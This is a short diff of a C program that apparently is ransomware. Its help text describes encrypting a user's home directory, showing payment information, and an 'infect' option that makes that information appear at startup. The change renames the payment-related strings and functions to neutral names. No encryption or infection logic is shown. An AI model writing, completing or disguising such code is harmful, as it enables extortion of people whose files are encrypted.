@@ -43,16 +43,16 @@ void help(void) {
 	printf("-t or --test: Do not delete or alter files.\n");
 	printf("-e or --encrypt keyfile: Encrypt user home and save key file.\n");
 	printf("-d or --decrypt keyfile: Decrypt user home using a key file.\n");
-	printf("-p or --print: Display payment information (default).\n");
-	printf("-i or --infect: Make payment information appear on startup.\n");
+	printf("-p or --print: Display information (default).\n");
+	printf("-i or --infect: Make -p information appear on startup.\n");
 }
 
 void version(void) {
 	printf("%s\n", PROGRAM_NAME);
 }
 
-int print_payment_info(void) {
-	printf("\n\n%s\n\n", PAYMENT_INFO);
+int print_info(void) {
+	printf("\n\n%s\n\n", PRINT_INFO);
 	return 0;
 }
 
@@ -323,7 +323,7 @@ int main(int argc, char **argv) {
 	}
 
 	if (opt_print) {
-		return print_payment_info();
+		return print_info();
 	}
 	if (opt_infect) {
 		return infect();
